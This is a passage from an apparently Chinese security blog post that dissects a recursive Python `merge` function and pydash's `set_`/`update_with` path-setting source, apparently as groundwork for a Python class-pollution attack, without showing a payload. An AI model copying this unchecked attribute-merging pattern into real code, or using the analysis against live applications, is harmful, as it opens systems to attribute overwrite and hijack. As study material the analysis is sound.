函数</h2>\n<p>​\t\t首先，在最开始看到 merge 函数的时候，我当时没有仔细看过这个函数的逻辑，现在来分析下这个函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先说一下我的知识盲区，算是因为这个，我才看不懂这个函数的源码的吧。</p>\n<p>​\t\t首先是字典的 items 方法， python 中的 items 是可以将字典中的所有项，以列表方式返回。大概情况如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = &#123;<span class=\"string\">&quot;a&quot;</span>:<span class=\"string\">&quot;1&quot;</span>,<span class=\"string\">&quot;b&quot;</span>:<span class=\"string\">&quot;2&quot;</span>,<span class=\"string\">&quot;c&quot;</span>:<span class=\"string\">&quot;123&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.items())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#dict_items([(&#x27;a&#x27;, &#x27;1&#x27;), (&#x27;b&#x27;, &#x27;2&#x27;), (&#x27;c&#x27;, &#x27;123&#x27;)])</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t其次就是 hasattr () 函数： <code>hasattr()</code>  是一个内置函数，用于检查对象是否具有给定的属性。这个函数接收两个参数：第一个参数是要检查的对象，第二个参数是要查找的属性名称。如果对象具有该属性，则  <code>hasattr()</code>  函数返回  <code>True</code> ，否则返回  <code>False</code> 。大概情况如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.a = <span class=\"number\">123</span></span><br><span class=\"line\">a = A()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hasattr</span>(a,<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后是 <code>__getitem__</code> 属性：在 Python 中， <code>__getitem__</code>  是一个特殊方法，用于定义对象的索引访问行为。它使得对象可以使用方括号  <code>[]</code>  进行<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclQjQlQTIlRTUlQkMlOTUlRTYlOTMlOEQlRTQlQkQlOUMmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">索引操作</span>，类似于列表、元组和字典等内置容器类型。</p>\n<p><strong>大致上，可以通过这个属性是否存在来判断某个对象是否为字典，不过不能准确确定下来。</strong></p>\n<p>​\t\t再之后是字典的 get 方法，这个是获取字典中指定键的值，具体不做演示。</p>\n<p>​\t\t最后：setattr () 函数的功能相对比较复杂，它最基础的功能是<strong>修改类实例对象中的属性值</strong>。其次，它还可以实现<strong>为实例对象动态添加属性或者方法</strong>。示例如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.a = <span class=\"number\">123</span></span><br><span class=\"line\">a = A()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.a)</span><br><span class=\"line\"><span class=\"built_in\">setattr</span>(a,<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;321&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.a)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#123</span></span><br><span class=\"line\"><span class=\"comment\">#321</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t好了，用下面这个做下测试，在函数里下一个断定，来调试看看：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a = &#123;<span class=\"string\">&quot;a&quot;</span>:<span class=\"string\">&quot;1&quot;</span>,<span class=\"string\">&quot;b&quot;</span>:<span class=\"string\">&quot;2&quot;</span>,<span class=\"string\">&quot;c&quot;</span>:<span class=\"string\">&quot;c&quot;</span>&#125;</span><br><span class=\"line\">c = &#123;<span class=\"string\">&quot;c&quot;</span>:<span class=\"string\">&quot;3&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">merge(a,c)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(c)</span><br></pre></td></tr></table></figure>\n<p>​\t\t最开始的时候，k，v 分别获取了 a 和 1 这两个字符，然后继续向后执行，当函数执行到 <code>if hasattr(dst, '__getitem__'):</code>  的时候，如果发现有 <code>__getitem__</code> 属性，则大致判断这个是个字典，执行下一步，如果没有，则判断目标字典里是否存在 a 这一个属性，以及是否为字典，如果是字典，则递归调用，如果不是字典，则执行 else 里面的语句，设置一个全新的属性在后面。在这里因为目标字典只有 c 字段，但是源对象是一个字典，所以会进入 if，进而设置一个新的属性，也就是成功加进去了。</p>\n<p>​\t\t <code>if dst.get(k) and type(v) == dict:</code>  这一行，检查目标字典的 k 键，也就是第一次进入时迭代获取到的 a 属性，目标是确认 a 属性是否有值，同时判断 k 是否为字典，如果 k 是字典，就递归执行。</p>\n<p><strong>大概就是这样的，可能不算很详细吧，这个只有自己打断点调试才能看出来吧。</strong><br>\n​</p>\n<h2 id=\"2-pydash的set_函数源码信息\"><a class=\"markdownIt-Anchor\" href=\"#2-pydash的set_函数源码信息\">#</a> 2、pydash 的 set_函数源码信息：</h2>\n<p>​\t\t无可奈何之下， 这里选择先审以下 set_的源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_</span>(<span class=\"params\">obj, path, value</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class=\"line\"><span class=\"string\">    it will be created.</span></span><br><span class=\"line\"><span class=\"string\">    设置由“path”描述的对象的值。如果对象路径的任何部分不存在，它将被创建。（这里稍微有点类似于flask的ssti里面找链子的方式。）</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        obj (list|dict): Object to modify.</span></span><br><span class=\"line\"><span class=\"string\">        path (str | list): Target path to set value to.</span></span><br><span class=\"line\"><span class=\"string\">        value (mixed): Value to set.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        mixed: Modified `obj`.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Warning:</span></span><br><span class=\"line\"><span class=\"string\">        `obj` is modified in place.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        [1, 2, [1]]</span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionadded:: 2.2.0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionchanged:: 3.3.0</span></span><br><span class=\"line\"><span class=\"string\">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionchanged:: 4.0.0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        - Modify `obj` in place.</span></span><br><span class=\"line\"><span class=\"string\">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class=\"line\"><span class=\"string\">          substrings are used.</span></span><br><span class=\"line\"><span class=\"string\">        - Remove alias ``deep_set``.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以发现，这个函数底层是使用的 set_with 函数，同时，这个函数会将第一个参数作为模板，将第二个参数通过点构成的类似链子的东西递归成一个对象，这种对象类似于第一个参数的类型，比如第一个参数传入的是一个字典，那么久递归成字典的形式，和它举的例子相似，这里久不进行操作了。</p>\n<p>​\t\t然后接下来就是 set_with 函数了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_with</span>(<span class=\"params\">obj, path, value, customizer=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class=\"line\"><span class=\"string\">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class=\"line\"><span class=\"string\">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class=\"line\"><span class=\"string\">    这个方法类似于：func:`set_`，除了它接受定制器，调用customizer生成路径的对象。如果customizer返回未定义的路径，则由该方法处理路径创建</span></span><br><span class=\"line\"><span class=\"string\">相反。使用三个参数调用customizer：`（nested_value、key、nested_object）``</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        obj (list|dict): Object to modify.</span></span><br><span class=\"line\"><span class=\"string\">        path (str | list): Target path to set value to.</span></span><br><span class=\"line\"><span class=\"string\">        value (mixed): Value to set.</span></span><br><span class=\"line\"><span class=\"string\">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        mixed: Modified `obj`.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Warning:</span></span><br><span class=\"line\"><span class=\"string\">        `obj` is modified in place.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionadded:: 4.0.0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionchanged:: 4.3.1</span></span><br><span class=\"line\"><span class=\"string\">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个函数底层调用了 update_with 函数，跟进看看，这个函数不是很能搞懂 customizer 这个参数的作业。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update_with</span>(<span class=\"params\">obj, path, updater, customizer=<span class=\"literal\">None</span></span>):  <span class=\"comment\"># noqa: C901</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class=\"line\"><span class=\"string\">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class=\"line\"><span class=\"string\">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        obj (list|dict): Object to modify.</span></span><br><span class=\"line\"><span class=\"string\">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class=\"line\"><span class=\"string\">        updater (callable): Function that returns updated value.</span></span><br><span class=\"line\"><span class=\"string\">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class=\"line\"><span class=\"string\">        </span></span><br><span class=\"line\"><span class=\"string\">        这个方法类似于：func:`update`，除了它接受定制器，调用定制器生成</span></span><br><span class=\"line\"><span class=\"string\">\t\t路径的对象。如果定制器返回“None”，则路径创建由以下方法处理</span></span><br><span class=\"line\"><span class=\"string\">\t\t相反。使用三个参数调用定制器：“（nested_value，key，nested_object）”。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        mixed: Updated `obj`.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Warning:</span></span><br><span class=\"line\"><span class=\"string\">        `obj` is modified in place.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    .. versionadded:: 4.0.0</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">callable</span>(updater):</span><br><span class=\"line\">        updater = pyd.constant(updater)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> customizer <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span> <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> <span class=\"built_in\">callable</span>(customizer):</span><br><span class=\"line\">        call_customizer = partial(callit, clone, customizer, argcount=<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> customizer:</span><br><span class=\"line\">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class=\"number\">3</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        call_customizer = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    default_type = <span class=\"built_in\">dict</span> <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(obj, <span class=\"built_in\">dict</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">list</span></span><br><span class=\"line\">    <span class=\"comment\">#使用 to_path_tokens(path) 将 path 转换为路径标记的列表。</span></span><br><span class=\"line\">    tokens = to_path_tokens(path)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#如果解析结果不是列表，则将其转换为单元素列表。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> pyd.is_list(tokens):  <span class=\"comment\"># pragma: no cover</span></span><br><span class=\"line\">        tokens = [tokens]</span><br><span class=\"line\"></span><br><span class=\"line\">    last_key = pyd.last(tokens)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(last_key, PathToken):</span><br><span class=\"line\">        last_key = last_key.key</span><br><span class=\"line\"></span><br><span class=\"line\">    target = obj</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> idx, token <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pyd.initial(tokens)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(token, PathToken):</span><br><span class=\"line\">            key = token.key</span><br><span class=\"line\">            default_factory = pyd.get(tokens, [idx + <span class=\"number\">1</span>, <span class=\"string\">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            key = token</span><br><span class=\"line\">            default_factory = default_type</span><br><span class=\"line\"></span><br><span class=\"line\">        obj_val = base_get(target, key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        path_obj = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> call_customizer:</span><br><span class=\"line\">            path_obj = call_customizer(obj_val, key, target)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> path_obj <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            path_obj = default_factory()</span><br><span class=\"line\"></span><br><span class=\"line\">        base_set(target, key, path_obj, allow_override=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            target = base_get(target, key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> TypeError <span class=\"keyword\">as</span> exc:  <span class=\"comment\"># pragma: no cover</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                target = target[<span class=\"built_in\">int</span>(key)]</span><br><span class=\"line\">                _failed = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">                _failed = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> _failed:</span><br><span class=\"line\">                <span class=\"keyword\">raise</span> TypeError(<span class=\"string\">f&quot;Unable to update object at index <span class=\"subst\">&#123;key!r&#125;</span>. <span class=\"subst\">&#123;exc&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    value = base_get(target, last_key, default=<span class=\"literal\">None</span>)</span><br><span class=\"line\">    base_set(target, last_key, callit(updater, value))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里先放着这个源码，先读一下 <code>to_path_tokens</code> ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">to_path_tokens</span>(<span class=\"params\">value</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> pyd.is_string(value) <span class=\"keyword\">and</span> (<span class=\"string\">&quot;.&quot;</span> <span class=\"keyword\">in</span> value <span class=\"keyword\">or</span> <span class=\"string\">&quot;[&quot;</span> <span class=\"keyword\">in</span> value):</span><br><span class=\"line\">        <span class=\"comment\"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class=\"line\">        <span class=\"comment\"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class=\"line\">        <span class=\"comment\"># list index and converted to an 